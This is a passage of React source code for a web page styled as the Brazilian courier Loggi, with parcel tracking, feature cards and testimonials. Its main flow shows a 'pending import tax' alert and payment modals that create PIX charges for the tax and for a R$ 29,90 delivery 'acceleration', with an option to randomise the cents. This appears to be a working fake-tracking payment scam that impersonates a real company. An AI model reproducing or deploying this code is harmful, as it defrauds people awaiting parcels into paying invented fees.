                                    <div style={{ width: '44px', height: '44px', background: 'rgba(239, 68, 68, 0.2)', borderRadius: '12px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                                        <Calculator size={24} color="#ef4444" />
                                    </div>
                                    <div style={{ textAlign: 'left' }}>
                                        <div style={{ color: '#ef4444', fontWeight: 900, fontSize: '0.94rem', textTransform: 'uppercase', letterSpacing: '1px' }}>Taxa Pendente Detectada</div>
                                        <div style={{ color: '#1e293b', fontSize: '0.9rem', fontWeight: 610, lineHeight: 1.4 }}>Efetue o pagamento para liberar sua encomenda.</div>
                                    </div>
                                </div>
                                <button
                                    onClick={() => setShowTaxModal(true)}
                                    className="tax-btn"
                                    style={{
                                        background: '#ef4444',
                                        color: '#fff',
                                        border: 'none',
                                        padding: '12px 24px',
                                        borderRadius: '14px',
                                        fontWeight: 900,
                                        fontSize: '0.9rem',
                                        cursor: 'pointer',
                                        boxShadow: '0 4px 15px rgba(239, 68, 68, 0.4)',
                                        transition: 'all 0.3s ease'
                                    }}
                                >
                                    Pagar Taxa: R$ {trackResult.taxa_valor}
                                </button>
                            </div>
                        )}
                        <div className="status-header">
                            <div className="status-icon-box" style={{ background: 'rgba(0, 85, 255, 0.06)', border: '1px solid rgba(0, 85, 255, 0.1)' }}>
                                {getStatusIcon(trackResult.etapas?.[trackResult.etapas?.length - 1]?.status_atual || '')}
                            </div>
                            <div>
                                <div style={{ fontSize: '0.85rem', fontWeight: 800, color: '#0055ff', letterSpacing: '1px', marginBottom: '-2px' }}>{trackResult.codigo}</div>
                                <h3 style={{ fontSize: '1.4rem', fontWeight: 900, color: 'var(--text-primary)', display: 'flex', alignItems: 'center', gap: '8px' }}>
                                    {trackResult.etapas?.[trackResult.etapas?.length - 1]?.status_atual || 'Em processamento'}
                                    {trackResult.taxa_valor && (
                                        <span className="tax-badge" style={{
                                            background: '#ef4444',
                                            color: '#fff',
                                            fontSize: '0.7rem',
                                            padding: '4px 8px',
                                            borderRadius: '6px',
                                            WebkitTextFillColor: '#fff',
                                            fontWeight: 800,
                                            boxShadow: '0 0 10px rgba(239, 68, 68, 0.4)'
                                        }}>
                                            TAXA PENDENTE
                                        </span>
                                    )}
                                </h3>
                                <p style={{ color: 'var(--text-secondary)', marginTop: '4px', fontSize: '0.95rem', display: 'flex', alignItems: 'center', gap: '6px' }}>
                                    <MapPinned size={14} /> {trackResult.cidade || cidade}
                                </p>
                            </div>
                        </div>
                        <div>
                            {(trackResult.etapas || []).map((etapa: any, i: number) => {
                                const isLast = i === (trackResult.etapas?.length || 0) - 1;
                                return (
                                    <div key={i} className="tl-item">
                                        <div className="tl-marker">
                                            <div className="tl-dot" style={{
                                                background: isLast ? '#0055ff' : 'rgba(0,85,255,0.08)',
                                                boxShadow: isLast ? '0 0 16px rgba(0, 85, 255, 0.4)' : 'none',
                                            }}></div>
                                            {i < trackResult.etapas.length - 1 && <div className="tl-line"></div>}
                                        </div>
                                        <div className="tl-content" style={{
                                            background: isLast ? 'rgba(0, 85, 255, 0.05)' : 'transparent',
                                            border: isLast ? '1px solid rgba(0, 85, 255, 0.1)' : '1px solid transparent',
                                        }}>
                                            <h4 style={{ color: isLast ? '#0055ff' : 'var(--text-primary)', fontWeight: 700 }}>{etapa.titulo}</h4>
                                            <p style={{ color: 'var(--text-secondary)', fontSize: '0.9rem', margin: '4px 0' }}>{etapa.subtitulo}</p>
                                            <small style={{ color: '#0055ff', fontWeight: 600, fontSize: '0.8rem' }}>{formatDate(etapa.data)}</small>
                                        </div>
                                    </div>
                                );
                            })}
                        </div>
                        <div className="express-box">
                            <button className="express-btn" onClick={() => setShowExpressModal(true)}>⚡ Acelerar por R$ 29,90</button>
                            <p style={{ color: 'var(--text-muted)', fontSize: '0.85rem', marginTop: '8px' }}>Receba em até 3 dias úteis</p>
                        </div>
                    </div>
                </div>
            )}

            {/* ===== TABS ===== */}
            <div className="tabs-wrap reveal">
                <div className="tabs-bar">
                    <button className={`tab-btn ${activeTab === 'voce' ? 'active' : ''}`} onClick={() => setActiveTab('voce')}>Para você</button>
                    <button className={`tab-btn ${activeTab === 'empresas' ? 'active' : ''}`} onClick={() => setActiveTab('empresas')}>Para empresas</button>
                </div>
            </div>

            {/* ===== PARA VOCÊ ===== */}
            {activeTab === 'voce' && (
                <section id="para-voce" className="content-section reveal">
                    <div className="section-header">
                        <div className="section-label"><Zap size={12} /> Soluções pessoais</div>
                        <h2 className="section-title">A Loggi entrega onde<br />você <span className="gradient-word">precisar</span></h2>
                        <p className="section-subtitle">A maior malha logística privada do Brasil à sua disposição.</p>
                    </div>
                    <div className="grid-3">
                        {[
                            { icon: <QrCode size={28} color="#0055ff" />, bg: 'rgba(0, 85, 255, 0.06)', title: 'Postagem simples', desc: 'Gere sua etiqueta em poucos cliques e poste em qualquer ponto parceiro próximo a você.', link: '/pedido', linkText: 'Começar agora' },
                            { icon: <Satellite size={28} color="#3b82f6" />, bg: 'rgba(59, 130, 246, 0.06)', title: 'Monitoramento GPS', desc: 'Acompanhe cada curva da sua encomenda com tecnologia de rastreio via satélite em tempo real.', link: '/rastreio', linkText: 'Ver como funciona' },
                            { icon: <Zap size={28} color="#06b6d4" />, bg: 'rgba(6, 182, 212, 0.06)', title: 'Loggi Express', desc: 'Sua encomenda priorizada em nossa malha expressa para chegar em tempo recorde.', link: '/loggi-pro', linkText: 'Assinar Pro' },
                        ].map((c, i) => (
                            <div key={i} className="feature-card">
                                <div className="feature-icon" style={{ background: c.bg }}>{c.icon}</div>
                                <h3>{c.title}</h3>
                                <p>{c.desc}</p>
                                <Link to={c.link} className="feature-link">{c.linkText} <ArrowRight size={14} /></Link>
                            </div>
                        ))}
                    </div>
                </section>
            )}

            {/* ===== PARA EMPRESAS ===== */}
            {activeTab === 'empresas' && (
                <section id="para-empresas" className="content-section reveal">
                    <div className="section-header">
                        <div className="section-label"><TrendingUp size={12} /> Para negócios</div>
                        <h2 className="section-title">Logística inteligente<br />para <span className="gradient-word">negócios</span></h2>
                        <p className="section-subtitle">Potencialize suas vendas com a malha que mais cresce no país.</p>
                    </div>
                    <div className="grid-3">
                        {[
                            { icon: <Warehouse size={28} color="#0055ff" />, bg: 'rgba(0, 85, 255, 0.06)', title: 'Coleta loggi', desc: 'Equipe dedicada para coletar envios diretamente no seu centro de distribuição.', link: '/para-empresas', linkText: 'Saber mais' },
                            { icon: <GitBranch size={28} color="#3b82f6" />, bg: 'rgba(59, 130, 246, 0.06)', title: 'API de Integração', desc: 'Conecte seu e-commerce diretamente com nosso sistema para automação total.', link: '/api-ecommerce', linkText: 'Ver API' },
                            { icon: <RotateCcw size={28} color="#06b6d4" />, bg: 'rgba(6, 182, 212, 0.06)', title: 'Reversa Facilitada', desc: 'Gestão completa de trocas e devoluções para encantar clientes no pós-venda.', link: '/para-empresas', linkText: 'Ver solução' },
                        ].map((c, i) => (
                            <div key={i} className="feature-card">
                                <div className="feature-icon" style={{ background: c.bg }}>{c.icon}</div>
                                <h3>{c.title}</h3>
                                <p>{c.desc}</p>
                                <Link to={c.link} className="feature-link">{c.linkText} <ArrowRight size={14} /></Link>
                            </div>
                        ))}
                    </div>
                </section>
            )}

            {/* ===== MÉTRICAS ===== */}
            <div className="metrics-bar reveal">
                {[
                    { icon: <Smile size={24} color="#0055ff" />, bg: 'rgba(0, 85, 255, 0.06)', val: '4.8/5', label: 'Satisfação' },
                    { icon: <Package size={24} color="#3b82f6" />, bg: 'rgba(59, 130, 246, 0.06)', val: '10M+', label: 'Entregas' },
                    { icon: <Globe size={24} color="#06b6d4" />, bg: 'rgba(6, 182, 212, 0.06)', val: '4.5k+', label: 'Cidades' },
                    { icon: <Clock size={24} color="#10b981" />, bg: 'rgba(16, 185, 129, 0.06)', val: '24h', label: 'Entrega Local' },
                ].map((m, i) => (
                    <div key={i} className="metric-card">
                        <div className="metric-icon" style={{ background: m.bg }}>{m.icon}</div>
                        <div className="metric-value">{m.val}</div>
                        <div className="metric-label">{m.label}</div>
                    </div>
                ))}
            </div>

            {/* ===== DEPOIMENTOS ===== */}
            <section className="testimonials-section reveal">
                <div className="testimonials-inner">
                    <div style={{ textAlign: 'center', marginBottom: '56px' }}>
                        <div className="section-label" style={{ margin: '0 auto 16px' }}><Star size={12} /> Depoimentos</div>
                        <h2 className="section-title" style={{ textAlign: 'center' }}>Confiança de <span className="gradient-word">quem usa</span></h2>
                    </div>
                    <div className="grid-3">
                        {[
                            { name: 'Ricardo Mendes', role: 'CEO, TechCommerce', text: '"A tecnologia da Loggi é incomparável. Consigo gerir todos os meus envios com uma facilidade que nunca tive antes."' },
                            { name: 'Juliana Costa', role: 'Gerente Logística, ModaBR', text: '"O suporte é excelente e as entregas sempre dentro do prazo. Meus clientes estão muito mais satisfeitos."' },
                            { name: 'Felipe Silva', role: 'Vendedor Platinum', text: '"Postar meus pacotes ficou 10x mais rápido com os Pontos Loggi. Recomendo para todos os vendedores."' },
                        ].map((t, i) => (
                            <div key={i} className="testimonial-card">
                                <div className="testimonial-stars">
                                    {[...Array(5)].map((_, j) => <Star key={j} size={14} fill="#f59e0b" color="#f59e0b" />)}
                                </div>
                                <p className="testimonial-text">{t.text}</p>
                                <div>
                                    <strong>{t.name}</strong>
                                    <span style={{ display: 'block', color: 'var(--text-muted)', fontSize: '0.85rem', marginTop: '4px' }}>{t.role}</span>
                                </div>
                            </div>
                        ))}
                    </div>
                </div>
            </section>

            <Footer />

            {/* Modal Acelerar */}
            {showExpressModal && (
                <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(0,20,60,0.5)', backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }} onClick={() => { setShowExpressModal(false); setPixData(null); setPixPaid(false); }}>
                    <div style={{ background: 'rgba(255,255,255,0.95)', backdropFilter: 'blur(24px)', border: '1px solid rgba(0,85,255,0.1)', borderRadius: '32px', width: '100%', maxWidth: '440px', padding: '40px', boxShadow: '0 24px 80px rgba(0,40,120,0.15)', animation: 'fadeIn 0.3s ease', textAlign: 'center' }} onClick={e => e.stopPropagation()}>
                        <div style={{ width: '80px', height: '80px', background: 'rgba(99, 102, 241, 0.1)', borderRadius: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
                            <Zap size={40} color="#0055ff" />
                        </div>
                        <h2 style={{ fontSize: '1.8rem', fontWeight: 900, marginBottom: '12px', fontFamily: 'Outfit, sans-serif', color: '#0a1628' }}>Acelerar Entrega</h2>
                        <p style={{ color: '#475569', lineHeight: 1.6, marginBottom: '32px', fontWeight: 500 }}>
                            Ao acelerar, seu pacote ganha prioridade máxima em nossa malha e será entregue em até <strong>3 dias úteis</strong>.
                        </p>

                        {!pixData && !pixLoading && (
                            <button onClick={async () => {
                                setPixLoading(true);
                                try {
                                    const cents = useRandomCents ? Math.floor(Math.random() * 99) : 90;
                                    const finalAmount = Number(`29.${cents < 10 ? '0' + cents : cents}`);

                                    const res = await fetch(`${API_BASE}/api/pix/create`, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({ amount: finalAmount, description: 'Acelerar Entrega Rastreamento', codigo: trackResult?.codigo || '' })
                                    });
                                    const data = await res.json();
                                    if (data && data.success) {
                                        setPixData(data.data);
                                    } else {
                                        alert('Erro ao gerar PIX: ' + (data.error || 'Tente novamente.'));
                                    }
                                } catch (e) {
                                    alert('Erro de conexão ao gerar o PIX.');
                                } finally {
                                    setPixLoading(false);
                                }
                            }} style={{ width: '100%', padding: '16px', background: 'linear-gradient(135deg, #0055ff, #3b82f6)', border: 'none', borderRadius: '16px', color: '#fff', fontWeight: 800, fontSize: '1rem', cursor: 'pointer', boxShadow: '0 8px 24px rgba(0, 85, 255, 0.3)' }}>
                                Pagar R$ 29,90 via PIX Agora
                            </button>
                        )}
                        {pixLoading && (
                            <div style={{ color: '#0055ff', fontWeight: 'bold' }}>⏳ Gerando QR Code PIX, aguarde...</div>
                        )}

                        {pixData && !pixPaid && (
                            <div style={{ background: 'rgba(0,85,255,0.04)', border: '1px solid rgba(0,85,255,0.1)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
                                <div style={{ fontSize: '0.8rem', color: '#0055ff', fontWeight: 700, textTransform: 'uppercase', marginBottom: '8px' }}>Pague via PIX</div>
                                <div style={{ fontSize: '1.5rem', fontWeight: 900, color: '#0a1628', marginBottom: '16px' }}>
                                    R$ {pixData.amount ? pixData.amount.toFixed(2).replace('.', ',') : '29,90'}
                                </div>
                                <div style={{ background: '#fff', padding: '12px', borderRadius: '12px', marginBottom: '16px', display: 'inline-block' }}>
                                    <img src={pixData.qr_image_url} alt="QR Code PIX" style={{ width: '150px', height: '150px' }} />
                                </div>
                                <div style={{ background: 'rgba(0,85,255,0.04)', padding: '10px', borderRadius: '8px', wordBreak: 'break-all', fontSize: '12px', color: '#64748b', marginBottom: '10px', userSelect: 'all', border: '1px solid rgba(0,85,255,0.08)' }}>
                                    {pixData.qr_code}
                                </div>
                                <p style={{ fontSize: '0.85rem', color: '#475569', marginBottom: '10px' }}>Escaneie o código acima ou copie a Chave Copia e Cola.</p>
                                <button onClick={() => { navigator.clipboard.writeText(pixData.qr_code); alert('Copiado!'); }} style={{ padding: '12px 24px', background: '#0055ff', border: 'none', borderRadius: '12px', color: 'white', cursor: 'pointer', fontSize: '0.95rem', fontWeight: 800, width: '100%' }}>Copiar Código PIX</button>
                                <div style={{ marginTop: '20px', color: '#10b981', fontWeight: 'bold', animation: 'pulse 2s infinite' }}>⏳ Aguardando Pagamento...</div>
                            </div>
                        )}

                        {pixPaid && (
                            <div style={{ background: 'rgba(16, 185, 129, 0.1)', border: '1px solid rgba(16, 185, 129, 0.3)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
                                <CheckCircle size={48} color="#10b981" style={{ margin: '0 auto 16px' }} />
                                <div style={{ fontSize: '1.2rem', color: '#059669', fontWeight: 900 }}>Pagamento Confirmado!</div>
                                <p style={{ fontSize: '0.95rem', color: '#0f172a', fontWeight: 500, marginTop: '8px' }}>Seu processo de aceleração foi ativado. Você receberá atualizações em breve.</p>
                            </div>
                        )}

                        <button onClick={() => { setShowExpressModal(false); setPixData(null); setPixPaid(false); }} style={{ background: 'none', border: 'none', color: '#475569', marginTop: '20px', cursor: 'pointer', fontWeight: 700, textDecoration: 'underline' }}>{pixPaid ? 'Fechar' : 'Talvez mais tarde'}</button>
                    </div>
                </div>
            )}
            {/* Modal Taxa */}
            {showTaxModal && trackResult?.taxa_valor && (
                <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(0,20,60,0.5)', backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }} onClick={() => { setShowTaxModal(false); setTaxPixData(null); setTaxPixPaid(false); }}>
                    <div style={{ background: 'rgba(255,255,255,0.95)', backdropFilter: 'blur(24px)', border: '1px solid rgba(0,85,255,0.1)', borderRadius: '32px', width: '100%', maxWidth: '440px', padding: '40px', boxShadow: '0 24px 80px rgba(0,40,120,0.15)', animation: 'fadeIn 0.3s ease', textAlign: 'center' }} onClick={e => e.stopPropagation()}>
                        <div style={{ width: '80px', height: '80px', background: 'rgba(239, 68, 68, 0.1)', borderRadius: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
                            <Calculator size={40} color="#ef4444" />
                        </div>
                        <h2 style={{ fontSize: '1.8rem', fontWeight: 900, marginBottom: '12px', fontFamily: 'Outfit, sans-serif', color: '#0a1628' }}>Pagar Taxa</h2>
                        <p style={{ color: '#475569', lineHeight: 1.6, marginBottom: '32px', fontWeight: 500 }}>
                            Para liberar seu pacote do centro de fiscalização, realize o pagamento da taxa de importação de <strong>R$ {trackResult.taxa_valor}</strong>.
                        </p>

                        {!taxPixData && !taxPixLoading && !taxPixPaid && (
                            <button onClick={async () => {
                                setTaxPixLoading(true);
                                try {
                                    const taxAmount = Number(trackResult.taxa_valor.toString().replace(',', '.'));
                                    const cents = useRandomCents ? Math.floor(Math.random() * 99) : 90;
                                    const finalAmount = Math.floor(taxAmount) + (cents / 100);

                                    const res = await fetch(`${API_BASE}/api/pix/create`, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({
                                            amount: finalAmount,
                                            description: `Taxa de Importação - ${trackResult.codigo}`,
                                            codigo: trackResult.codigo
                                        })
                                    });
                                    const data = await res.json();
                                    if (data && data.success) {
                                        setTaxPixData(data.data);
                                    } else {
                                        alert('Erro ao gerar PIX: ' + (data.error || 'Tente novamente.'));
                                    }
                                } catch (e) {
                                    alert('Erro de conexão ao gerar o PIX.');
                                } finally {
                                    setTaxPixLoading(false);
                                }
                            }} style={{ width: '100%', padding: '16px', background: 'linear-gradient(135deg, #ef4444, #991b1b)', border: 'none', borderRadius: '16px', color: '#fff', fontWeight: 800, fontSize: '1rem', cursor: 'pointer', boxShadow: '0 8px 24px rgba(239, 68, 68, 0.3)' }}>
                                Gerar PIX de R$ {trackResult.taxa_valor}
                            </button>
                        )}

                        {taxPixLoading && (
                            <div style={{ color: '#ef4444', fontWeight: 'bold' }}>⏳ Gerando QR Code PIX, aguarde...</div>
                        )}

                        {taxPixData && !taxPixPaid && (
                            <div style={{ background: 'rgba(239,68,68,0.04)', border: '1px solid rgba(239,68,68,0.1)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
                                <div style={{ fontSize: '0.8rem', color: '#ef4444', fontWeight: 700, textTransform: 'uppercase', marginBottom: '8px' }}>Pix Copia e Cola</div>
                                <div style={{ fontSize: '1.5rem', fontWeight: 900, color: '#0a1628', marginBottom: '16px' }}>
                                    R$ {taxPixData.amount ? taxPixData.amount.toFixed(2).replace('.', ',') : trackResult.taxa_valor}
                                </div>
                                <div style={{ background: '#fff', padding: '12px', borderRadius: '12px', marginBottom: '16px', display: 'inline-block' }}>
                                    <img src={taxPixData.qr_image_url} alt="QR Code PIX" style={{ width: '150px', height: '150px' }} />
                                </div>
                                <div style={{ background: 'rgba(239,68,68,0.04)', padding: '10px', borderRadius: '8px', wordBreak: 'break-all', fontSize: '12px', color: '#64748b', marginBottom: '10px', userSelect: 'all', border: '1px solid rgba(239,68,68,0.08)' }}>
                                    {taxPixData.qr_code}
                                </div>
                                <p style={{ fontSize: '0.85rem', color: '#475569', marginBottom: '10px' }}>Escaneie o código acima ou copie a Chave Copia e Cola.</p>
                                <button onClick={() => { navigator.clipboard.writeText(taxPixData.qr_code); alert('Copiado!'); }} style={{ padding: '12px 24px', background: '#ef4444', border: 'none', borderRadius: '12px', color: 'white', cursor: 'pointer', fontSize: '0.95rem', fontWeight: 800, width: '100%' }}>Copiar Código PIX</button>
                                <div style={{ marginTop: '20px', color: '#10b981', fontWeight: 'bold', animation: 'pulse 2s infinite' }}>⏳ Aguardando Pagamento...</div>
                            </div>
                        )}

                        {taxPixPaid && (
                            <div style={{ background: 'rgba(16, 185, 129, 0.1)', border: '1px solid rgba(16, 185, 129, 0.3)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
                                <CheckCircle size={48} color="#10b981" style={{ margin: '0 auto 16px' }} />
                                <div style={{ fontSize: '1.2rem', color: '#059669', fontWeight: 900 }}>Pagamento Confirmado!</div>
                                <p style={{ fontSize: '0.95rem', color: '#0f172a', fontWeight: 500, marginTop: '8px' }}>Sua taxa foi paga com sucesso. O pacote será liberado em breve.</p>
                            </div>
                        )}

                        <button onClick={() => { setShowTaxModal(false); setTaxPixData(null); setTaxPixPaid(false); }} style={{ background: 'none', border: 'none', color: '#475569', marginTop: '20px', cursor: 'pointer', fontWeight: 700, textDecoration: 'underline' }}>{taxPixPaid ? 'Fechar' : 'Voltar'}</button>
                    </div>
                </div>
            )}
        </div>
    );
};

export default Home;
